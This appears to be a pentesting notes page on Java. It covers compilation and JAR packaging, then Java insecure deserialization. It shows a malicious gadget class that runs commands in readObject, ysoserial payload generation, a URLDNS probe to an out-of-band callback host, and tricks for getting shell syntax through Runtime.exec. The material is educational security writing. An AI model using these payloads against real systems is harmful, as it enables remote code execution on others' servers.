---
description: An Object-Oriented programming language often used in enterprise environments
---

# Java

## Description

Java is an Object-Oriented programming language that compiles into Java bytecode. The Java Virtual Machine (JVM) understands this bytecode and can run it. You code it in `.java` files and then there are a few more file types that the compiler goes through:

* `.java` files are Java Source Code
* `.class` files are the compiled bytecode
* `.jar` files are a package of `.class` files (like a ZIP)
* JVM unpacks `.jar` and runs `.class` bytecode

### Hello World

Create a file that has the **same name as the class**:

{% code title="HelloWorld.java" %}
```java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
    }
}
```
{% endcode %}

Then you can either compile and run it directly using `java`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ java HelloWorld.java
</strong>Hello, World!
</code></pre>

Or compile it to bytecode, and run it later:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ javac HelloWorld.java
</strong><strong>$ file HelloWorld.class 
</strong>HelloWorld.class: compiled Java class data, version 55.0
<strong>$ java HelloWorld
</strong>Hello, World!
</code></pre>

Lastly, you can bundle the `.class` files into a JAR with some information like the **entry point**. This requires a `Manifest.txt` file with a `Main-Class` key set to the main class. This class needs to have the `main()` function we defined with its exact function signature.&#x20;

{% code title="Manifest.txt" %}
```yaml
Main-Class: HelloWorld

```
{% endcode %}

In the above file, the extra _newline at the end_ is important for some reason, don't forget it! \
Afterward, you can bundle the files into a `.jar` ([source](https://docs.oracle.com/javase/tutorial/deployment/jar/appman.html)):

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ jar cfm HelloWorld.jar Manifest.txt HelloWorld.class 
</strong><strong>$ java -jar HelloWorld.jar 
</strong>Hello, World!
</code></pre>

### Libraries

Any programming language is made powerful by libraries. For Java, there are multiple build tools you can choose from for large projects, like Maven or Gradle. For a simple case, however, we can do this manually just using `java` commands.&#x20;

We'll start by finding a library JAR we want to use. We'll take [jackson-databind](https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind) as an example that we can find on the [mvnrepository](https://mvnrepository.com/) site. After choosing a specific version, we find a button to download the `.jar` file\`: ![](<../.gitbook/assets/image (48).png>). This file will need to be included along with your source code. We'll put it in a `lib/` folder next to the source code:

{% code title="Tree" %}
```
HelloWorld.java
lib
└── jackson-databind-2.17.0.jar
```
{% endcode %}

Inside our source code, we can import the classes from this JAR now with the path from mvnrepository:

```java
import com.fasterxml.jackson.databind.*;
```

After writing the code with this library that you want, use the classpath (`-cp`) option while compiling to add the libraries to the compiled version:

```bash
java -cp '.:./lib/*' HelloWorld.java
```

## Insecure Deserialization

{% embed url="https://learn.snyk.io/lesson/insecure-deserialization/" %}
Great simple introduction to the idea of Insecure Deserialization in Java
{% endembed %}

The `ObjectOutputStream.writeObject()` method can serialize an instance of an Object (that implements `Serializable`) into binary data (`ByteArrayOutputStream`). This can then be sent to any other system, which can reconstruct the Object by calling the `ObjectInputStream.readObject()` method on the binary data (`ByteArrayInputStream`).&#x20;

Here is an example:

```java
class Data implements Serializable {
    public String name;

    public Data(String name) {
        this.name = name;
    }
}
```

<pre class="language-java"><code class="lang-java">public class Example {
    public static void main(String[] args) throws Exception {
        // Create instance
        Data instance = new Data("Jorian");
<strong>        byte[] serialized = serialize(instance);
</strong>        System.out.println(Arrays.toString(serialized));  // [-84, -19, ..., 97, 110]
        // [...send over the network...]

        // Deserialize from byte array
<strong>        Data deserialized = (Data) deserialize(serialized);
</strong>        System.out.println(deserialized.name);  // "Jorian"
    }

    private static byte[] serialize(Object instance) throws Exception {
<strong>        ByteArrayOutputStream baos = new ByteArrayOutputStream();
</strong><strong>        ObjectOutputStream oos = new ObjectOutputStream(baos);
</strong><strong>        oos.writeObject(instance);  // Create "explanation" of instance as bytes
</strong>        oos.close();

        return baos.toByteArray();
    }

    private static Object deserialize(byte[] serialized) throws Exception {
<strong>        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serialized));
</strong><strong>        return ois.readObject();  // Set attributes on Data instance to recreate
</strong>    }
}
</code></pre>

While this is useful and easy to implement, its flexibility has some security risks. The risk is an attacker passing serialized data to a deserializer with **different types** than the original type, or altering the data to make it malicious. In the above example, it expects to deserialize a `Data` Object, but the byte array can hold any type to deserialize into.&#x20;

After being deserialized, it would obviously not pass as a valid `Data` Object, and not have a `.name` attribute for example. But some code that still executes is the _custom_ code that parses the byte array into an instance, which might still contain sensitive actions that you can perform at will:

<pre class="language-java"><code class="lang-java">public class EvilGadget implements Serializable {
    private String command;
    
    public EvilGadget(String command) {
        this.command = command;
    }
    
<strong>    private void readObject(ObjectInputStream in) throws Exception {
</strong><strong>        in.defaultReadObject();  // Set attributes (command) as default would
</strong><strong>        Runtime.getRuntime().exec(command);  // Custom code
</strong><strong>    }
</strong>}
</code></pre>

The above could be some library function that the developer of this `Example` doesn't know about. The default `readObject` can be **overridden** in this way, with a `.defaultReadObject()` still being available to run the default method still. Before or after though, a developer can choose to write any extra code that needs to be executed to correctly deserialize the data. In the above gadget, a dangerous `exec(command)` call is included which can now be executed at will by the attacker by creating a malicious serialized object!

To exploit it, the attack must create and serialize a malicious object themselves, and then make the target deserialize it in some way:

```java
class Generate {
    public static void main(String[] args) throws IOException {
        // Create malicious instance
        EvilGadget instance = new EvilGadget("calc.exe");
        // Serialize to byte array
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(instance);
        oos.close();
        // Print as Base64
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
```

When the target deserializes the payload, the `command` attribute will be set and the `exec()` command in `readObject()` will be executed, launching a calculator on Windows.&#x20;

While this example was very clear, most real-world exploits use multiple **chained** gadgets to eventually reach a sensitive function with user input. This is possible because attributes can be Objects as well, and their attributes can be more Objects, etc. Creating such a payload is very similar to the example above but just requires more `new` objects in arguments like this:

```java
EvilUncle instance = new EvilUncle(new EvilParent(new EvilChild("calc.exe")));
```

### ysoserial

Instead of searching and creating new gadget chains for every deserialization issue you find, often well-known chains in libraries used in many projects can be enough.&#x20;

{% embed url="https://github.com/frohoff/ysoserial/tree/master" %}
Tool for generating Java Insecure Deserialization payload using well-known chains
{% endembed %}

The `ysoserial` tool contains a [collection of payloads](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads) that work on different versions and libraries. Depending on which your target uses, any of these can be a quick win.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ java -jar ysoserial.jar
</strong>
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
Available payload types:
     Payload             Authors                                Dependencies                                                                                                                                                                                        
     -------             -------                                ------------                                                                                                                                                                                        
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
     Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     Groovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        
     Hibernate1          @mbechler                                                                                                                                                                                                                                  
     Hibernate2          @mbechler                                                                                                                                                                                                                                  
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
     JRMPClient          @mbechler                                                                                                                                                                                                                                  
     JRMPListener        @mbechler                                                                                                                                                                                                                                  
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
     Jdk7u21             @frohoff                                                                                                                                                                                                                                   
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
     MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
     MozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            
     Myfaces1            @mbechler                                                                                                                                                                                                                                  
     Myfaces2            @mbechler                                                                                                                                                                                                                                  
     ROME                @mbechler                              rome:1.0                                                                                                                                                                                            
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
     URLDNS              @gebl                                                                                                                                                                                                                                      
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                 
</code></pre>

Use a payload by choosing the name as the first argument, and a fitting command as the second. A payload like [`CommonsCollections6`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java) requires a command, so the following will generate it:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ java -jar ysoserial.jar CommonsCollections6 'calc.exe' | base64 -w 0
</strong>rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAe...
</code></pre>

{% hint style="warning" %}
If you are receiving `InaccessibleObjectException` or `IllegalAccessError`, this is because _Java >12_ does not allow the way ysoserial accesses classes. \
The `--illegal-access=permit` argument can be added to fix it, but after _Java 17_ even this is not allowed. From there, explicit `--add-opens` arguments need to be added which [this gist](https://gist.github.com/JorianWoltjer/5210e99c13189446ece5ffe3e9fe3d90) can do for you.

Often the **easiest** **fix** however is to simply generate payloads with an **older Java version**.
{% endhint %}

### DNS Probe using `java.net`

A useful payload for **confirming** an insecure deserialization vulnerability is [`URLDNS`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java) in ysoserial. This has **no dependencies** and performs a DNS lookup of a URL you provide.&#x20;

For a full explanation, see [this page](https://book.hacktricks.xyz/pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe). The summary is that the `java.net.URL` class has a `.hashCode()` method that resolves the given URL and this method is automatically called when it is put into a `java.util.HashMap`.&#x20;

Start a DNS listener using Burp Suite Professional, or using [`interactsh`](https://github.com/projectdiscovery/interactsh). Then generate the payload to execute on your target:

<pre class="language-shell-session" data-title="Start listener"><code class="lang-shell-session"><strong>$ interactsh-client
</strong>[INF] Listing 1 payload for OOB Testing
[INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro
</code></pre>

<pre class="language-shell-session" data-title="Generate payload"><code class="lang-shell-session"><strong>$ java -jar ysoserial.jar URLDNS 'http://cj79geiq8gua4a3eseu0jheqyjanc9t8k.oast.pro' | base64 -w 0
</strong>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgA...
</code></pre>

### `Runtime.exec()` to Shell

For a proof-of-concept, executing a simple program like `calc.exe` on Windows may be enough. However, for Linux and more complicated payloads, you might require special `bash` syntax like `|` pipes or `>` redirects. Take the following example:

```java
Runtime.getRuntime().exec("id > /tmp/pwned")
```

It does not write to `/tmp/pwned`, but instead, runs `id` with the arguments  `'>'` and `'/tmp/pwned'`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ id '>' '/tmp/pwned'
</strong>id: extra operand ‘/tmp/pwned’
Try 'id --help' for more information.
</code></pre>

For a reverse shell or more complicated proof-of-concept, you can circumvent this using a few different tricks. \
[The first](https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html) uses `$@` together with piping into `|sh` to re-enable the use of these symbols, as a string is directly put into the STDIN of `sh`. The following payload would work:

```java
Runtime.getRuntime().exec("sh -c $@|sh . echo id > /tmp/pwned")
```

Some more tricks include using `bash` with Base64 and the `{,}` syntax, or using Python or Perl to evaluate code in a single command. Use the generator below to create these payloads easily:

{% embed url="https://ares-x.com/tools/runtime-exec/" %}
Payload Generator for `sh`, `bash`, PowerShell, Python and Perl tricks for `Runtime.exec()`
{% endembed %}
